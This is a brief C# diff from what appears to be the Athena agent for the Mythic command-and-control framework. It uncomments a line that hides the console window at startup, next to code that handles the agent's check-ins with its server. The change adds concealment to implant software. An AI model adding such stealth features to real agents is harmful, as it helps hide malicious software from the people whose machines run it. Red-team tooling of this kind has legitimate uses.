@@ -30,7 +30,7 @@ namespace Athena
             int missedCheckins = 0;
             bool exit = false;
 
-            // ShowWindow(GetConsoleWindow(), 0);
+            ShowWindow(GetConsoleWindow(), 0);
 
             //MythicClient controls all of the agent communications
             Globals.mc = new MythicClient();
